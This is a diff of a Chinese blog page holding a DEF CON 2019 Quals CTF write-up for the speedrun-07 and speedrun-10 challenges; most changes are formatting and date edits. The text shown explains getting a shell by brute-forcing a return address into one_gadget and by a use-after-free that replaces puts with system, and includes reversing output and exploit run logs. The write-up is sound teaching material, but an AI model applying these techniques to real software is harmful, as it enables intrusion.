-#   [rsp+0x70] == NULL</code></pre><h2 id="speedrun-07"><a href="#speedrun-07" class="headerlink" title="speedrun-07"></a>speedrun-07</h2><h3 id="Reversing-2"><a href="#Reversing-2" class="headerlink" title="Reversing"></a>Reversing</h3><pre><code>ssize_t hack()
+#   [rsp+0x70] == NULL</code></pre><h2 id="speedrun-07"><a href="#speedrun-07" class="headerlink" title="speedrun-07"></a>speedrun-07</h2><p><strong>Reversing</strong></p>
+<pre><code>ssize_t hack()
 {
   int v1; // [rsp+8h] [rbp-408h]
   char v2; // [rsp+Eh] [rbp-402h]
@@ -757,8 +1004,10 @@ io.interactive()
   }
   return write(1, &quot;So cool.\n&quot;, 9uLL);
 }</code></pre><p>buf[v1]=v2，buf地址后0xffff位任意写。程序开了PIE。</p>
-<h3 id="Pwning-2"><a href="#Pwning-2" class="headerlink" title="Pwning"></a>Pwning</h3><p>ROP的指令跳转需要ELF_addr和libc的地址才能getshell。无奈情况只能用猜字节，main函数栈返回地址是libc_start_main+231，改后三个字节为 one_gadget，简单计算暴力攻击4096次应该能爆出来。</p>
-<h3 id="Pwned！"><a href="#Pwned！" class="headerlink" title="Pwned！"></a>Pwned！</h3><pre><code>[+] Starting local process &#39;./speedrun-007&#39;: pid 23454
+<p><strong>Pwning</strong></p>
+<p>ROP的指令跳转需要ELF_addr和libc的地址才能getshell。无奈情况只能用猜字节，main函数栈返回地址是libc_start_main+231，改后三个字节为 one_gadget，简单计算暴力攻击4096次应该能爆出来。</p>
+<p><strong>Pwned！</strong></p>
+<pre><code>[+] Starting local process &#39;./speedrun-007&#39;: pid 23454
 [+] Receiving all data: Done (0B)
 [*] Process &#39;./speedrun-007&#39; stopped with exit code -11 (SIGSEGV) (pid 23454)
 (&#39;Try #%d&#39;, 2704)
@@ -854,7 +1103,8 @@ if __name__==&quot;__main__&quot;:
 # constraints:
 #   [rsp+0x70] == NULL&quot;&quot;
 
-#0x638</code></pre><h2 id="speedrun-10"><a href="#speedrun-10" class="headerlink" title="speedrun-10"></a>speedrun-10</h2><h3 id="Reversing-3"><a href="#Reversing-3" class="headerlink" title="Reversing"></a>Reversing</h3><pre><code>primelee@vmware Desktop/CTF/now % checksec speedrun-010                                                                                        23:29:52
+#0x638</code></pre><h2 id="speedrun-10"><a href="#speedrun-10" class="headerlink" title="speedrun-10"></a>speedrun-10</h2><p><strong>Reversing</strong></p>
+<pre><code>primelee@vmware Desktop/CTF/now % checksec speedrun-010                                                                                        23:29:52
 [*] &#39;/home/primelee/Desktop/CTF/now/speedrun-010&#39;
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -908,7 +1158,8 @@ Choose something.
           return __readfsqword(0x28u) ^ v8;
         free(msg_list[v3-- - 1]);
         break;</code></pre><p>漏洞在于释放堆，为置零，通过UAF可以泄露puts@got内容。name_chunk 和 msg_chunk 重叠，更改name_chunk 处的puts为system实现弹shell。</p>
-<h3 id="Pwned-3"><a href="#Pwned-3" class="headerlink" title="Pwned!"></a>Pwned!</h3><pre><code>#! /bin/env python
+<p><strong>Pwned!</strong></p>
+<pre><code>#! /bin/env python
 #coding=utf8
 #============
 # name_chunk [0,48]
@@ -985,9 +1236,9 @@ io.interactive()</code></pre>
     <p><span class="copy-title">文章标题:</span>Defcon2019Q</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-04-09, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-09, 13:42:50</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/09/Defcon2019Q/" title="Defcon2019Q">https://primelyw.github.io/2020/04/09/Defcon2019Q/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-11, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-11, 15:10:19</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/11/Defcon2019Q/" title="Defcon2019Q">https://primelyw.github.io/2020/04/11/Defcon2019Q/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
@@ -1031,7 +1282,7 @@ io.interactive()</code></pre>
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#CVE','#Pwn','#CTF','#Defcon','#fuzz','#afl',],
+            'data': ['#Pwn','#CTF','#CVE','#Defcon','#fuzz','#afl',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
@@ -1115,53 +1366,6 @@ io.interactive()</code></pre>
 
 <!--自定义样式设置-->
 <style>
-    
-    
-    .nav {
-        width: 542px;
-    }
-    .nav.fullscreen {
-        margin-left: -542px;
-    }
-    .nav-left {
-        width: 120px;
-    }
-    
-    
-    @media screen and (max-width: 1468px) {
-        .nav {
-            width: 492px;
-        }
-        .nav.fullscreen {
-            margin-left: -492px;
-        }
-        .nav-left {
-            width: 100px;
-        }
-    }
-    
-    
-    @media screen and (max-width: 1024px) {
-        .nav {
-            width: 492px;
-            margin-left: -492px
-        }
-        .nav.fullscreen {
-            margin-left: 0;
-        }
-        .nav .hide-list.fullscreen {
-            left: 492px
-        }
-    }
-    
-    @media screen and (max-width: 426px) {
-        .nav {
-            width: 100%;
-        }
-        .nav-left {
-            width: 100%;
-        }
-    }
     
     
     .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
